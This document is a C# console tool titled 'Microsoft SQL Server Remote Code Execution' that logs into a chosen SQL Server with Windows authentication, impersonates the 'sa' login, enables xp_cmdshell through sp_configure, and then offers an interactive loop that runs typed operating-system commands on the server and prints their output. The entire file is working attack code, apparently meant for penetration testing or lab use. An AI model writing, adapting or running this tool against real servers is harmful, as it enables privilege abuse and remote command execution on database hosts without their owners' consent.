using System;
using System.Data.SqlClient;
using System.Diagnostics;
using System.Threading;

namespace SQL_RCE
{
    class Program
    {
        static bool verbose = false;

        static void Main(string[] args)
        {
            // Parse -v / --verbose flag from command-line arguments
            foreach (string arg in args)
            {
                if (arg.Equals("-v", StringComparison.OrdinalIgnoreCase) ||
                    arg.Equals("--verbose", StringComparison.OrdinalIgnoreCase))
                {
                    verbose = true;
                }
            }

            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.WriteLine("------------------------------------------------------------------------------------------------------------------------");
            Console.WriteLine("|                                                                                                                      |");
            Console.WriteLine("|                         Microsoft SQL Server Remote Code Execution v1.2                                               |");
            Console.WriteLine("|                                      Built by Majid alkindi                                                          |");
            Console.WriteLine("|                                                                                                                      |");
            Console.WriteLine("|              Connects to a SQL Server using Windows Authentication, impersonates sa,                                 |");
            Console.WriteLine("|              enables xp_cmdshell, and provides an interactive OS command shell                                       |");
            Console.WriteLine("|                                                                                                                      |");
            Console.WriteLine("------------------------------------------------------------------------------------------------------------------------");
            Console.ResetColor();
            Console.WriteLine();
            if (verbose) Console.WriteLine("[V] Verbose mode: ON\n");

            // Outer loop — reconnect to a different server without restarting
            while (true)
            {
                Console.ForegroundColor = ConsoleColor.Yellow;
                Console.Write("Enter the SQL Server instance (or 'quit' to exit): ");
                Console.ResetColor();
                string sqlServer = Console.ReadLine()?.Trim();

                if (string.IsNullOrEmpty(sqlServer))
                    continue;

                if (sqlServer.Equals("quit", StringComparison.OrdinalIgnoreCase))
                {
Console.ForegroundColor = ConsoleColor.Yellow;
                        Console.WriteLine("[*] Goodbye.");
                        Console.ResetColor();
                    break;
                }

                string conString = $"Server={sqlServer};Database=master;Integrated Security=True;Connection Timeout=10;";

                if (verbose)
                    Console.WriteLine($"[V] Connection string: {conString}");

                using (SqlConnection con = new SqlConnection(conString))
                {
                    try
                    {
                        if (verbose)
                        {
                            // Spinner progress while connecting
                            bool done = false;
                            var spinner = new Thread(() =>
                            {
                                char[] frames = { '|', '/', '-', '\\' };
                                int i = 0;
                                Console.Write($"[*] Connecting to {sqlServer} ");
                                while (!done)
                                {
                                    Console.Write(frames[i++ % frames.Length]);
                                    Thread.Sleep(120);
                                    Console.Write("\b");
                                }
                            });
                            spinner.IsBackground = true;
                            spinner.Start();
                            con.Open();
                            done = true;
                            spinner.Join();
                            Console.ForegroundColor = ConsoleColor.Green;
                            Console.WriteLine($"\r[+] Auth success! (Server: {sqlServer})          ");
                            Console.ResetColor();
                        }
                        else
                        {
                            con.Open();
                            Console.ForegroundColor = ConsoleColor.Green;
                            Console.WriteLine($"[+] Auth success! (Server: {sqlServer})");
                            Console.ResetColor();
                        }
                    }
                    catch (Exception ex)
                    {
                        Console.ForegroundColor = ConsoleColor.Red;
                        Console.WriteLine($"[-] Auth failed: {ex.Message}");
                        Console.ForegroundColor = ConsoleColor.Yellow;
                        Console.WriteLine("[*] Try a different server.\n");
                        Console.ResetColor();
                        continue;   // back to outer loop — ask for server again
                    }

                    // Setup steps
                    ExecuteNonQuery(con, "EXECUTE AS LOGIN = 'sa';",                                        "Impersonating 'sa'");
                    ExecuteNonQuery(con, "EXEC sp_configure 'show advanced options', 1; RECONFIGURE;",      "Enabling advanced options");
                    ExecuteNonQuery(con, "EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;",               "Enabling xp_cmdshell");

                    Console.ForegroundColor = ConsoleColor.Green;
                    Console.WriteLine("[+] xp_cmdshell enabled.");
                    Console.ForegroundColor = ConsoleColor.DarkCyan;
                    Console.WriteLine("[*] Commands: type OS commands, 'verbose' to toggle verbose, 'exit' for new server, 'quit' to exit.\n");
                    Console.ResetColor();

                    // Inner command loop
                    while (true)
                    {
                        Console.ForegroundColor = ConsoleColor.Green;
                        Console.Write("command :::::> ");
                        Console.ResetColor();
                        string execCmd = Console.ReadLine();

                        if (string.IsNullOrWhiteSpace(execCmd))
                            continue;

                        if (execCmd.Equals("quit", StringComparison.OrdinalIgnoreCase))
                        {
                            Console.ForegroundColor = ConsoleColor.Yellow;
                            Console.WriteLine("[*] Goodbye.");
                            Console.ResetColor();
                            return;
                        }

                        if (execCmd.Equals("exit", StringComparison.OrdinalIgnoreCase))
                        {
                            Console.ForegroundColor = ConsoleColor.Yellow;
                            Console.WriteLine("[*] Disconnecting. Returning to server selection.\n");
                            Console.ResetColor();
                            break;  // break inner loop → outer loop asks for new server
                        }

                        if (execCmd.Equals("verbose", StringComparison.OrdinalIgnoreCase))
                        {
                            verbose = !verbose;
                            Console.ForegroundColor = ConsoleColor.DarkCyan;
                            Console.WriteLine($"[*] Verbose mode: {(verbose ? "ON" : "OFF")}");
                            Console.ResetColor();
                            continue;
                        }

                        try
                        {
                            if (verbose)
                                Console.WriteLine($"[V] Executing: EXEC xp_cmdshell '{execCmd}'");

                            var sw = Stopwatch.StartNew();

                            using (SqlCommand command = new SqlCommand("EXEC xp_cmdshell @cmd", con))
                            {
                                command.Parameters.AddWithValue("@cmd", execCmd);
                                using (SqlDataReader reader = command.ExecuteReader())
                                {
                                    int lineCount = 0;
                                    while (reader.Read())
                                    {
                                        if (!reader.IsDBNull(0))
                                        {
                                            Console.WriteLine(reader[0]);
                                            lineCount++;
                                        }
                                    }

                                    sw.Stop();
                                    if (verbose)
                                        Console.WriteLine($"[V] {lineCount} line(s) returned in {sw.ElapsedMilliseconds}ms");
                                }
                            }
                        }
                        catch (Exception ex)
                        {
                            Console.ForegroundColor = ConsoleColor.Red;
                        Console.WriteLine($"[-] Error: {ex.Message}");
                        Console.ResetColor();
                        }
                    }
                }
            }
        }

        static void ExecuteNonQuery(SqlConnection con, string sql, string description = null)
        {
            try
            {
                if (verbose && description != null)
                    Console.WriteLine($"[V] {description}: {sql}");

                using (SqlCommand cmd = new SqlCommand(sql, con))
                    cmd.ExecuteNonQuery();

                if (verbose && description != null)
                    Console.WriteLine($"[V] OK: {description}");
            }
            catch (Exception ex)
            {
                Console.ForegroundColor = ConsoleColor.DarkYellow;
                Console.WriteLine($"[!] Warning ({description ?? "setup"}): {ex.Message}");
                Console.ResetColor();
            }
        }
    }
}


